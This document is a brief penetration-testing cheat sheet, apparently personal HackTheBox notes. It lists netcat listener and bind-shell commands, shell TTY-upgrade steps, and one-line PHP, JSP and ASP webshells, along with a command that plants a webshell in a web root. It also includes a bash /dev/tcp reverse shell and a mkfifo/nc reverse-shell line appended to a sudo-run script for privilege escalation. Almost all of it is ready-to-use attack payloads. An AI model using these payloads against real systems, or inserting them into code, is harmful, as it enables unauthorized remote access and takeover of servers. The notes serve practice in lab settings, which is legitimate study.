>[ reverse shells](https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell)
### reverse using netcat
```bash
nc -lvnp 1234
```
l for listening
v for verbost 
n for ip only , speed up by preventing using dns
p for port 

### bindshell
```bash
nc 10.10.10.1 1234
```
### Upgrading to full TTY 
```bash
 python -c 'import pty; pty.spawn("/bin/bash")' OR
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@remotehost$ ^Z [1] Stopped nc -lvnp 1234 
 st3phan0@htb[/htb]$ stty raw -  echo 
 st3phan0@htb[/htb]$ fg
 www-data@remotehost$ export TERM=xterm-256color 
 www-data@remotehost$ stty rows 67 columns 318
```



## Webshell 
        PHP
`<?php system($_REQUEST["cmd"]); ?>`

        jsp
`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`

        asp
`<% eval request("cmd") %>`

|Web Server|Default Webroot|
|---|---|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|

**for example**
``` bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

#### Practise
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444  0>&1'"); ?>
```
save as .php

```bash
sudo nc -lvnp 4444
```
> ports below 1024 requires sudo 

after scanning using LinEnum.sh, and found no pw sudo files, we do the appending 

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.201 8443 >/tmp/f' | tee -a monitor.sh
```